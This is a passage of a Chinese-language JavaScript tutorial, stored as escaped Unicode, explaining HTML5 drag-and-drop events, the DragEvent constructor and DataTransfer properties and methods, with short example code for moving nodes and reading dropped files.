\u5c5e\u6027\u662f\u5f53\u524d\u8282\u70b9\u3002\u5982\u679c\u8981\u5728\u89c6\u89c9\u4e0a\u663e\u793a\u62d6\u62c9\u79bb\u5f00\u64cd\u4f5c\u5f53\u524d\u8282\u70b9\uff0c\u5c31\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3002 drop \uff1a\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u6216\u9009\u4e2d\u7684\u6587\u672c\uff0c\u91ca\u653e\u5230\u76ee\u6807\u8282\u70b9\u65f6\uff0c\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u89e6\u53d1\u3002\u6ce8\u610f\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u4e0d\u5141\u8bb8 drop \uff0c\u5373\u4f7f\u5728\u8be5\u8282\u70b9\u4e0a\u65b9\u677e\u5f00\u9f20\u6807\u952e\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002\u5982\u679c\u7528\u6237\u6309\u4e0b ESC \u952e\uff0c\u53d6\u6d88\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u8d1f\u8d23\u53d6\u51fa\u62d6\u62c9\u6570\u636e\uff0c\u5e76\u8fdb\u884c\u76f8\u5173\u5904\u7406\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u5c55\u793a\uff0c\u5982\u4f55\u52a8\u6001\u6539\u53d8\u88ab\u62d6\u52a8\u8282\u70b9\u7684\u80cc\u666f\u8272\u3002 1 2 3 4 5 6 7 div . addEventListener ( 'dragstart' , function ( e ) { this . style . backgroundColor = 'red' ; }, false ); div . addEventListener ( 'dragend' , function ( e ) { this . style . backgroundColor = 'green' ; }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c div \u8282\u70b9\u88ab\u62d6\u52a8\u65f6\uff0c\u80cc\u666f\u8272\u4f1a\u53d8\u4e3a\u7ea2\u8272\uff0c\u62d6\u52a8\u7ed3\u675f\uff0c\u53c8\u53d8\u56de\u7eff\u8272\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5c55\u793a\u5982\u4f55\u5b9e\u73b0\u5c06\u4e00\u4e2a\u8282\u70b9\u4ece\u5f53\u524d\u7236\u8282\u70b9\uff0c\u62d6\u62c9\u5230\u53e6\u4e00\u4e2a\u7236\u8282\u70b9\u4e2d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 /* HTML \u4ee3\u7801\u5982\u4e0b <div class=\"dropzone\"> <div id=\"draggable\" draggable=\"true\"> \u8be5\u8282\u70b9\u53ef\u62d6\u62c9 </div> </div> <div class=\"dropzone\"></div> <div class=\"dropzone\"></div> <div class=\"dropzone\"></div> */ // \u88ab\u62d6\u62c9\u8282\u70b9 var dragged ; document . addEventListener ( 'dragstart' , function ( event ) { // \u4fdd\u5b58\u88ab\u62d6\u62c9\u8282\u70b9 dragged = event . target ; // \u88ab\u62d6\u62c9\u8282\u70b9\u7684\u80cc\u666f\u8272\u53d8\u900f\u660e event . target . style . opacity = 0.5 ; }, false ); document . addEventListener ( 'dragend' , function ( event ) { // \u88ab\u62d6\u62c9\u8282\u70b9\u7684\u80cc\u666f\u8272\u6062\u590d\u6b63\u5e38 event . target . style . opacity = '' ; }, false ); document . addEventListener ( 'dragover' , function ( event ) { // \u9632\u6b62\u62d6\u62c9\u6548\u679c\u88ab\u91cd\u7f6e\uff0c\u5141\u8bb8\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u653e\u5165\u76ee\u6807\u8282\u70b9 event . preventDefault (); }, false ); document . addEventListener ( 'dragenter' , function ( event ) { // \u76ee\u6807\u8282\u70b9\u7684\u80cc\u666f\u8272\u53d8\u7d2b\u8272 // \u7531\u4e8e\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\uff0c\u6240\u4ee5\u8981\u8fc7\u6ee4\u8282\u70b9 if ( event . target . className === 'dropzone' ) { event . target . style . background = 'purple' ; } }, false ); document . addEventListener ( 'dragleave' , function ( event ) { // \u76ee\u6807\u8282\u70b9\u7684\u80cc\u666f\u8272\u6062\u590d\u539f\u6837 if ( event . target . className === 'dropzone' ) { event . target . style . background = '' ; } }, false ); document . addEventListener ( 'drop' , function ( event ) { // \u9632\u6b62\u4e8b\u4ef6\u9ed8\u8ba4\u884c\u4e3a\uff08\u6bd4\u5982\u67d0\u4e9b\u5143\u7d20\u8282\u70b9\u4e0a\u53ef\u4ee5\u6253\u5f00\u94fe\u63a5\uff09\uff0c event . preventDefault (); if ( event . target . className === 'dropzone' ) { // \u6062\u590d\u76ee\u6807\u8282\u70b9\u80cc\u666f\u8272 event . target . style . background = '' ; // \u5c06\u88ab\u62d6\u62c9\u8282\u70b9\u63d2\u5165\u76ee\u6807\u8282\u70b9 dragged . parentNode . removeChild ( dragged ); event . target . appendChild ( dragged ); } }, false ); \u5173\u4e8e\u62d6\u62c9\u4e8b\u4ef6\uff0c\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6ce8\u610f\u70b9\u3002 \u62d6\u62c9\u8fc7\u7a0b\u53ea\u89e6\u53d1\u4ee5\u4e0a\u8fd9\u4e9b\u62d6\u62c9\u4e8b\u4ef6\uff0c\u5c3d\u7ba1\u9f20\u6807\u5728\u79fb\u52a8\uff0c\u4f46\u662f\u9f20\u6807\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\u3002 \u5c06\u6587\u4ef6\u4ece\u64cd\u4f5c\u7cfb\u7edf\u62d6\u62c9\u8fdb\u6d4f\u89c8\u5668\uff0c\u4e0d\u4f1a\u89e6\u53d1 dragstart \u548c dragend \u4e8b\u4ef6\u3002 dragenter \u548c dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u7528\u6765\u53d6\u51fa\u62d6\u62c9\u7684\u6570\u636e\uff08\u5373\u5141\u8bb8\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u5143\u7d20\uff09\u3002\u7531\u4e8e\u7f51\u9875\u7684\u5927\u90e8\u5206\u533a\u57df\u4e0d\u9002\u5408\u4f5c\u4e3a\u653e\u4e0b\u62d6\u62c9\u5143\u7d20\u7684\u76ee\u6807\u8282\u70b9\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f53\u524d\u8282\u70b9\u4e0d\u5141\u8bb8\u63a5\u53d7\u88ab\u62d6\u62c9\u7684\u5143\u7d20\u3002\u5982\u679c\u60f3\u8981\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u653e\u4e0b\u7684\u6570\u636e\uff0c\u9996\u5148\u5fc5\u987b\u963b\u6b62\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002 1 2 < div ondragover = \"return false\" > < div ondragover = \"event.preventDefault()\" > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u53d6\u6d88\u62d6\u62c9\u4e8b\u4ef6\u6216\u8005\u963b\u6b62\u9ed8\u8ba4\u884c\u4e3a\uff0c\u5c31\u4e0d\u80fd\u5728 div \u8282\u70b9\u4e0a\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u3002 DragEvent \u63a5\u53e3 \u00b6 \u62d6\u62c9\u4e8b\u4ef6\u90fd\u7ee7\u627f\u4e86 DragEvent \u63a5\u53e3\uff0c\u8fd9\u4e2a\u63a5\u53e3\u53c8\u7ee7\u627f\u4e86 MouseEvent \u63a5\u53e3\u548c Event \u63a5\u53e3\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a DragEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u62d6\u62c9\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new DragEvent ( type , options ) DragEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u7c7b\u578b\uff0c\u8be5\u53c2\u6570\u5fc5\u987b\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\uff0c\u7528\u6765\u8bbe\u7f6e\u4e8b\u4ef6\u7684\u5c5e\u6027\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u914d\u7f6e\u5bf9\u8c61\u9664\u4e86\u63a5\u53d7 MouseEvent \u63a5\u53e3\u548c Event \u63a5\u53e3\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u7f6e dataTransfer \u5c5e\u6027\u8981\u4e48\u662f null \uff0c\u8981\u4e48\u662f\u4e00\u4e2a DataTransfer \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 DataTransfer \u7684\u5b9e\u4f8b\u5bf9\u8c61\u7528\u6765\u8bfb\u5199\u62d6\u62c9\u4e8b\u4ef6\u4e2d\u4f20\u8f93\u7684\u6570\u636e\uff0c\u8be6\u89c1\u4e0b\u6587\u300aDataTransfer \u63a5\u53e3\u300b\u7684\u90e8\u5206\u3002 DataTransfer \u63a5\u53e3\u6982\u8ff0 \u00b6 \u6240\u6709\u62d6\u62c9\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u90fd\u6709\u4e00\u4e2a DragEvent.dataTransfer \u5c5e\u6027\uff0c\u7528\u6765\u8bfb\u5199\u9700\u8981\u4f20\u9012\u7684\u6570\u636e\u3002\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a DataTransfer \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a DataTransfer() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 DataTransfer \u5b9e\u4f8b\u5bf9\u8c61\u3002 1 var dataTrans = new DataTransfer (); DataTransfer() \u6784\u9020\u51fd\u6570\u4e0d\u63a5\u53d7\u53c2\u6570\u3002 \u62d6\u62c9\u7684\u6570\u636e\u5206\u6210\u4e24\u65b9\u9762\uff1a\u6570\u636e\u7684\u79cd\u7c7b\uff08\u53c8\u79f0\u683c\u5f0f\uff09\u548c\u6570\u636e\u7684\u503c\u3002\u6570\u636e\u7684\u79cd\u7c7b\u662f\u4e00\u4e2a MIME \u5b57\u7b26\u4e32\uff08\u6bd4\u5982 text/plain \u3001 image/jpeg \uff09\uff0c\u6570\u636e\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u62d6\u62c9\u4e00\u6bb5\u6587\u672c\uff0c\u5219\u6570\u636e\u9ed8\u8ba4\u5c31\u662f\u90a3\u6bb5\u6587\u672c\uff1b\u5982\u679c\u62d6\u62c9\u4e00\u4e2a\u94fe\u63a5\uff0c\u5219\u6570\u636e\u9ed8\u8ba4\u5c31\u662f\u94fe\u63a5\u7684 URL\u3002 \u62d6\u62c9\u4e8b\u4ef6\u5f00\u59cb\u65f6\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u63d0\u4f9b\u6570\u636e\u7c7b\u578b\u548c\u6570\u636e\u503c\u3002\u62d6\u62c9\u8fc7\u7a0b\u4e2d\uff0c\u5f00\u53d1\u8005\u901a\u8fc7 dragenter \u548c dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u68c0\u67e5\u6570\u636e\u7c7b\u578b\uff0c\u4ee5\u786e\u5b9a\u662f\u5426\u5141\u8bb8\u653e\u4e0b\uff08drop\uff09\u88ab\u62d6\u62c9\u7684\u5bf9\u8c61\u3002\u6bd4\u5982\uff0c\u5728\u53ea\u5141\u8bb8\u653e\u4e0b\u94fe\u63a5\u7684\u533a\u57df\uff0c\u68c0\u67e5\u62d6\u62c9\u7684\u6570\u636e\u7c7b\u578b\u662f\u5426\u4e3a text/uri-list \u3002 \u53d1\u751f drop \u4e8b\u4ef6\u65f6\uff0c\u76d1\u542c\u51fd\u6570\u53d6\u51fa\u62d6\u62c9\u7684\u6570\u636e\uff0c\u5bf9\u5176\u8fdb\u884c\u5904\u7406\u3002 DataTransfer \u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 DataTransfer.dropEffect \u00b6 DataTransfer.dropEffect \u5c5e\u6027\u7528\u6765\u8bbe\u7f6e\u653e\u4e0b\uff08drop\uff09\u88ab\u62d6\u62c9\u8282\u70b9\u65f6\u7684\u6548\u679c\uff0c\u4f1a\u5f71\u54cd\u5230\u62d6\u62c9\u7ecf\u8fc7\u76f8\u5173\u533a\u57df\u65f6\u9f20\u6807\u7684\u5f62\u72b6\u3002\u5b83\u53ef\u80fd\u53d6\u4e0b\u9762\u7684\u503c\u3002 copy\uff1a\u590d\u5236\u88ab\u62d6\u62c9\u7684\u8282\u70b9 move\uff1a\u79fb\u52a8\u88ab\u62d6\u62c9\u7684\u8282\u70b9 link\uff1a\u521b\u5efa\u6307\u5411\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u7684\u94fe\u63a5 none\uff1a\u65e0\u6cd5\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u8282\u70b9 \u9664\u4e86\u4e0a\u9762\u8fd9\u4e9b\u503c\uff0c\u8bbe\u7f6e\u5176\u4ed6\u7684\u503c\u90fd\u662f\u65e0\u6548\u7684\u3002 1 2 3 4 5 target . addEventListener ( 'dragover' , function ( e ) { e . preventDefault (); e . stopPropagation (); e . dataTransfer . dropEffect = 'copy' ; }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u88ab\u62d6\u62c9\u5143\u7d20\u4e00\u65e6 drop \uff0c\u63a5\u53d7\u7684\u533a\u57df\u4f1a\u590d\u5236\u8be5\u8282\u70b9\u3002 dropEffect \u5c5e\u6027\u4e00\u822c\u5728 dragenter \u548c dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u8bbe\u7f6e\uff0c\u5bf9\u4e8e dragstart \u3001 drag \u3001 dragleave \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\uff0c\u8be5\u5c5e\u6027\u4e0d\u8d77\u4f5c\u7528\u3002\u56e0\u4e3a\u8be5\u5c5e\u6027\u53ea\u5bf9\u63a5\u53d7\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u7684\u533a\u57df\u6709\u6548\uff0c\u5bf9\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u672c\u8eab\u662f\u65e0\u6548\u7684\u3002\u8fdb\u5165\u76ee\u6807\u533a\u57df\u540e\uff0c\u62d6\u62c9\u884c\u4e3a\u4f1a\u521d\u59cb\u5316\u6210\u8bbe\u5b9a\u7684\u6548\u679c\u3002 DataTransfer.effectAllowed \u00b6 DataTransfer.effectAllowed \u5c5e\u6027\u8bbe\u7f6e\u672c\u6b21\u62d6\u62c9\u4e2d\u5141\u8bb8\u7684\u6548\u679c\u3002\u5b83\u53ef\u80fd\u53d6\u4e0b\u9762\u7684\u503c\u3002 copy\uff1a\u590d\u5236\u88ab\u62d6\u62c9\u7684\u8282\u70b9 move\uff1a\u79fb\u52a8\u88ab\u62d6\u62c9\u7684\u8282\u70b9 link\uff1a\u521b\u5efa\u6307\u5411\u88ab\u62d6\u62c9\u8282\u70b9\u7684\u94fe\u63a5 copyLink\uff1a\u5141\u8bb8 copy \u6216 link copyMove\uff1a\u5141\u8bb8 copy \u6216 move linkMove\uff1a\u5141\u8bb8 link \u6216 move all\uff1a\u5141\u8bb8\u6240\u6709\u6548\u679c none\uff1a\u65e0\u6cd5\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u8282\u70b9 uninitialized\uff1a\u9ed8\u8ba4\u503c\uff0c\u7b49\u540c\u4e8e all \u5982\u679c\u67d0\u79cd\u6548\u679c\u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u7528\u6237\u5c31\u65e0\u6cd5\u5728\u76ee\u6807\u8282\u70b9\u4e2d\u8fbe\u6210\u8fd9\u79cd\u6548\u679c\u3002 \u8fd9\u4e2a\u5c5e\u6027\u4e0e dropEffect \u5c5e\u6027\u662f\u540c\u4e00\u4ef6\u4e8b\u7684\u4e24\u4e2a\u65b9\u9762\u3002\u524d\u8005\u8bbe\u7f6e\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u5141\u8bb8\u7684\u6548\u679c\uff0c\u540e\u8005\u8bbe\u7f6e\u63a5\u53d7\u62d6\u62c9\u7684\u533a\u57df\u7684\u6548\u679c\uff0c\u5b83\u4eec\u5f80\u5f80\u914d\u5408\u4f7f\u7528\u3002 dragstart \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u3002\u5176\u4ed6\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u662f\u65e0\u6548\u7684\u3002 1 2 3 4 5 6 7 source . addEventListener ( 'dragstart' , function ( e ) { e . dataTransfer . effectAllowed = 'move' ; }); target . addEventListener ( 'dragover' , function ( e ) { e . dataTransfer . dropEffect = 'move' ; }); \u53ea\u8981 dropEffect \u5c5e\u6027\u548c effectAllowed \u5c5e\u6027\u4e4b\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e3a none \uff0c\u5c31\u65e0\u6cd5\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u5b8c\u6210 drop \u64cd\u4f5c\u3002 DataTransfer.files \u00b6 DataTransfer.files \u5c5e\u6027\u662f\u4e00\u4e2a FileList \u5bf9\u8c61\uff0c\u5305\u542b\u4e00\u7ec4\u672c\u5730\u6587\u4ef6\uff0c\u53ef\u4ee5\u7528\u6765\u5728\u62d6\u62c9\u64cd\u4f5c\u4e2d\u4f20\u9001\u3002\u5982\u679c\u672c\u6b21\u62d6\u62c9\u4e0d\u6d89\u53ca\u6587\u4ef6\uff0c\u5219\u8be5\u5c5e\u6027\u4e3a\u7a7a\u7684 FileList \u5bf9\u8c61\u3002 \u4e0b\u9762\u5c31\u662f\u4e00\u4e2a\u63a5\u6536\u62d6\u62c9\u6587\u4ef6\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"output\" style=\"min-height: 200px;border: 1px solid black;\"> // \u6587\u4ef6\u62d6\u62c9\u5230\u8fd9\u91cc // </div> var div = document . getElementById ( 'output' ); div . addEventListener ( \"dragenter\" , function ( event ) { div . textContent = '' ; event . stopPropagation (); event . preventDefault (); }, false ); div . addEventListener ( \"dragover\" , function ( event ) { event . stopPropagation (); event . preventDefault (); }, false ); div . addEventListener ( \"drop\" , function ( event ) { event . stopPropagation (); event . preventDefault (); var files = event . dataTransfer . files ; for ( var i = 0 ; i < files . length ; i ++ ) { div . textContent += files [ i ]. name + ' ' + files [ i ]. size + '\u5b57\u8282\\n' ; } }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 dataTransfer.files \u5c5e\u6027\u8bfb\u53d6\u88ab\u62d6\u62c9\u7684\u6587\u4ef6\u7684\u4fe1\u606f\u3002\u5982\u679c\u60f3\u8981\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u5c31\u8981\u4f7f\u7528 FileReader \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 div . addEventListener ( 'drop' , function ( e ) { e . preventDefault (); e . stopPropagation (); var fileList = e . dataTransfer . files ; if ( fileList . length > 0 ) { var file = fileList [ 0 ]; var reader = new FileReader (); reader . onloadend = function ( e ) { if ( e . target . readyState === FileReader . DONE ) { var content = reader . result ; div . innerHTML = 'File: ' + file . name + '\\n\\n' + content ; } } reader . readAsBinaryString ( file ); } }); DataTransfer.types \u00b6 DataTransfer.types \u5c5e\u6027\u662f\u4e00\u4e2a\u53ea\u8bfb\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6210\u5458\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u91cc\u9762\u662f\u62d6\u62c9\u7684\u6570\u636e\u683c\u5f0f\uff08\u901a\u5e38\u662f MIME \u503c\uff09\u3002\u6bd4\u5982\uff0c\u5982\u679c\u62d6\u62c9\u7684\u662f\u6587\u5b57\uff0c\u5bf9\u5e94\u7684\u6210\u5458\u5c31\u662f text/plain \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7\u68c0\u67e5 dataTransfer \u5c5e\u6027\u7684\u7c7b\u578b\uff0c\u51b3\u5b9a\u662f\u5426\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u6267\u884c drop \u64cd\u4f5c\u3002 1 2 3 4 5 6 7 8 9 10 11 function contains ( list , value ){ for ( var i = 0 ; i < list . length ; ++ i ) { if ( list [ i ] === value ) return true ; } return false ; } function doDragOver ( event ) { var isLink = contains ( event . dataTransfer . types , 'text/uri-list' ); if ( isLink ) event . preventDefault (); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709\u5f53\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u6709\u4e00\u4e2a\u662f\u94fe\u63a5\u65f6\uff0c\u624d\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u653e\u4e0b\u3002 DataTransfer.items \u00b6 DataTransfer.items \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u53ea\u8bfb\u5bf9\u8c61\uff08DataTransferItemList \u5b9e\u4f8b\uff09\uff0c\u6bcf\u4e2a\u6210\u5458\u5c31\u662f\u672c\u6b21\u62d6\u62c9\u7684\u4e00\u4e2a\u5bf9\u8c61\uff08DataTransferItem \u5b9e\u4f8b\uff09\u3002\u5982\u679c\u672c\u6b21\u62d6\u62c9\u4e0d\u5305\u542b\u5bf9\u8c61\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002 DataTransferItemList \u5b9e\u4f8b\u5177\u6709\u4ee5\u4e0b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 length \uff1a\u8fd4\u56de\u6210\u5458\u7684\u6570\u91cf add(data, type) \uff1a\u589e\u52a0\u4e00\u4e2a\u6307\u5b9a\u5185\u5bb9\u548c\u7c7b\u578b\uff08\u6bd4\u5982 text/html \u548c text/plain \uff09\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6210\u5458 add(file) \uff1a add \u65b9\u6cd5\u7684\u53e6\u4e00\u79cd\u7528\u6cd5\uff0c\u589e\u52a0\u4e00\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u6210\u5458 remove(index) \uff1a\u79fb\u9664\u6307\u5b9a\u4f4d\u7f6e\u7684\u6210\u5458 clear() \uff1a\u79fb\u9664\u6240\u6709\u7684\u6210\u5458 DataTransferItem \u5b9e\u4f8b\u5177\u6709\u4ee5\u4e0b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 kind \uff1a\u8fd4\u56de\u6210\u5458\u7684\u79cd\u7c7b\uff08 string \u8fd8\u662f file \uff09\u3002 type \uff1a\u8fd4\u56de\u6210\u5458\u7684\u7c7b\u578b\uff08\u901a\u5e38\u662f MIME \u503c\uff09\u3002 getAsFile() \uff1a\u5982\u679c\u88ab\u62d6\u62c9\u662f\u6587\u4ef6\uff0c\u8fd4\u56de\u8be5\u6587\u4ef6\uff0c\u5426\u5219\u8fd4\u56de null \u3002 getAsString(callback) \uff1a\u5982\u679c\u88ab\u62d6\u62c9\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u5c06\u8be5\u5b57\u7b26\u4f20\u5165\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u5904\u7406\u3002\u8be5\u65b9\u6cd5\u662f\u5f02\u6b65\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 div . addEventListener ( 'drop' , function ( e ) { e . preventDefault (); if ( e . dataTransfer . items != null ) { for ( var i = 0 ; i < e . dataTransfer . items . length ; i ++ ) { console . log ( e . dataTransfer . items [ i ]. kind + ': ' + e . dataTransfer . items [ i ]. type ); } } }); DataTransfer \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 DataTransfer.setData() \u00b6 DataTransfer.setData() \u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u62d6\u62c9\u4e8b\u4ef6\u6240\u5e26\u6709\u7684\u6570\u636e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 event . dataTransfer . setData ( 'text/plain' , 'Text to drag' ); \u4e0a\u9762\u4ee3\u7801\u4e3a\u5f53\u524d\u7684\u62d6\u62c9\u4e8b\u4ef6\u52a0\u5165\u7eaf\u6587\u672c\u6570\u636e\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u5b57\u7b26\u4e32\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u6570\u636e\u7c7b\u578b\uff08\u6bd4\u5982 text/plain \uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5177\u4f53\u6570\u636e\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u5728 dataTransfer \u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6570\u636e\u5c06\u88ab\u52a0\u5165\uff0c\u5426\u5219\u539f\u6709\u7684\u6570\u636e\u5c06\u88ab\u65b0\u6570\u636e\u66ff\u6362\u3002 \u5982\u679c\u662f\u62d6\u62c9\u6587\u672c\u6846\u6216\u8005\u62d6\u62c9\u9009\u4e2d\u7684\u6587\u672c\uff0c\u4f1a\u9ed8\u8ba4\u5c06\u5bf9\u5e94\u7684\u6587\u672c\u6570\u636e\uff0c\u6dfb\u52a0\u5230 dataTransfer \u5c5e\u6027\uff0c\u4e0d\u7528\u624b\u52a8\u6307\u5b9a\u3002 1 2 3 < div draggable = \"true\" > aaa </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62d6\u62c9\u8fd9\u4e2a <div> \u5143\u7d20\u4f1a\u81ea\u52a8\u5e26\u4e0a\u6587\u672c\u6570\u636e aaa \u3002 \u4f7f\u7528 setData \u65b9\u6cd5\uff0c\u53ef\u4ee5\u66ff\u6362\u5230\u539f\u6709\u6570\u636e\u3002 1 2 3 4 5 6 < div draggable = \"true\" ondragstart = \"event.dataTransfer.setData('text/plain', 'bbb')\" > aaa </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62d6\u62c9\u6570\u636e\u5b9e\u9645\u4e0a\u662f bbb \uff0c\u800c\u4e0d\u662f aaa \u3002 \u4e0b\u9762\u662f\u6dfb\u52a0\u5176\u4ed6\u7c7b\u578b\u7684\u6570\u636e\u3002\u7531\u4e8e text/plain \u662f\u6700\u666e\u904d\u652f\u6301\u7684\u683c\u5f0f\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\u6027\uff0c\u5efa\u8bae\u6700\u540e\u603b\u662f\u4fdd\u5b58\u4e00\u4efd\u7eaf\u6587\u672c\u683c\u5f0f\u7684\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var dt = event . dataTransfer ; // \u6dfb\u52a0\u94fe\u63a5 dt . setData ( 'text/uri-list' , 'http://www.example.com' ); dt . setData ( 'text/plain' , 'http://www.example.com' ); // \u6dfb\u52a0 HTML \u4ee3\u7801 dt . setData ( 'text/html' , 'Hello there, <strong>stranger</strong>' ); dt . setData ( 'text/plain' , 'Hello there, <strong>stranger</strong>' ); // \u6dfb\u52a0\u56fe\u50cf\u7684 URL dt . setData ( 'text/uri-list' , imageurl ); dt . setData ( 'text/plain' , imageurl ); \u53ef\u4ee5\u4e00\u6b21\u63d0\u4f9b\u591a\u79cd\u683c\u5f0f\u7684\u6570\u636e\u3002 1 2 3 4 var dt = event . dataTransfer ; dt . setData ( 'application/x-bookmark' , bookmarkString ); dt . setData ( 'text/uri-list' , 'http://www.example.com' ); dt . setData ( 'text/plain' , 'http://www.example.com' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7\u5728\u540c\u4e00\u4e2a\u4e8b\u4ef6\u4e0a\u9762\uff0c\u5b58\u653e\u4e09\u79cd\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4f7f\u5f97\u62d6\u62c9\u4e8b\u4ef6\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u5bf9\u8c61\u4e0a\u9762\uff0c drop 